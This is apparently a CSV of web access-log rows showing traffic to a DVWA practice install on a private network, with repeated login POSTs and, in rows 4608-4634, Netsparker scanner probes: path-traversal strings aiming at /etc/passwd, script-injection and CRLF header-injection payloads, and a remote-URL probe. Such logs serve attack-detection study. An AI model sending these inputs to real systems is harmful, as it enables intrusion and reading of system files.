,ip_address,remote_log_name,authenticated_user_name,timestamp,method,requesta_url,protocol,status_code,bytes_transferred,referrer_url,user_agent
4579,192.168.4.164,,,[22/Dec/2016:15:20:43 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4580,192.168.4.164,,,[22/Dec/2016:15:20:43 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4581,192.168.4.164,,,[22/Dec/2016:15:20:43 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4582,192.168.4.164,,,[22/Dec/2016:15:20:43 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4583,192.168.4.164,,,[22/Dec/2016:15:20:43 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4584,192.168.4.164,,,[22/Dec/2016:15:20:43 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4585,192.168.4.164,,,[22/Dec/2016:15:20:43 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4586,192.168.4.164,,,[22/Dec/2016:15:20:43 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4587,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1004,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4588,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1004,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4589,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1004,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4590,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4591,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4592,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4593,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4594,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4595,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4596,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4597,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4598,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4599,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4600,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4601,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4602,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4603,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4604,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1009,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4605,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4606,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4607,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4608,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%0anetsparker(0x00031E)%3b,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4609,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%0anetsparker(0x00031F)%3b,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4610,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%20netsparker(0x00031C)%20,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4611,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%20netsparker(0x00031D)%20,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4612,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%22%2bnetsparker(0x000310)%2b%22,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4613,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%22%2bnetsparker(0x000311)%2b%22,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4614,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4615,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%26%2339%3b%2cnetsparker(0x000316)%2c%26%2339%3b,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4616,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%26%2339%3b%2cnetsparker(0x000317)%2c%26%2339%3b,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4617,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%5c%27%3bnetsparker(0x000312)%3b%2f%2f%2f,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4618,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=%5c%27%3bnetsparker(0x000313)%3b%2f%2f%2f,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4619,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4620,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/?C=N%3bO%3dD%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,HTTP/1.1,200,868,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4621,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php,HTTP/1.1,200,763,"'\""@--></style></scRipt><scRipt>netsparker(0x000318)</scRipt>","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4622,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php,HTTP/1.1,200,763,"'\""@--></style></scRipt><scRipt>netsparker(0x000319)</scRipt>","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4623,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php,HTTP/1.1,200,763,ns:netsparker056650=vuln,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4624,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php,HTTP/1.1,200,763,ns:netsparker056650=vuln,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4625,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php%0Ans:netsparker056650=vuln,HTTP/1.1,404,550,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4626,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php%0D%0Ans:netsparker056650=vuln,HTTP/1.1,404,551,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4627,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000322)%3C/scRipt%3E,HTTP/1.1,404,616,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4628,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000323)%3C/scRipt%3E,HTTP/1.1,404,616,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4629,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000326)%3C/scRipt%3E,HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4630,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000327)%3C/scRipt%3E,HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4631,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php/%22ns=%22netsparker(0x000328),HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4632,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php?http://r87.com/?,HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4633,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php?nsextt=%0ans%3anetsparker056650%3dvuln,HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4634,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],GET,/DVWA/vulnerabilities/view_help.php?nsextt=%0d%0ans%3anetsparker056650%3dvuln,HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4635,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,383,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4636,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,383,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4637,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4638,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4639,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4640,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4641,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4642,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4643,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4644,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4645,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4646,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4647,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4648,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4649,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4650,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4651,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4652,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4653,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4654,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4655,192.168.4.164,,,[22/Dec/2016:15:20:44 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4656,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1004,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4657,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4658,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
4659,192.168.4.164,,,[22/Dec/2016:15:20:45 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
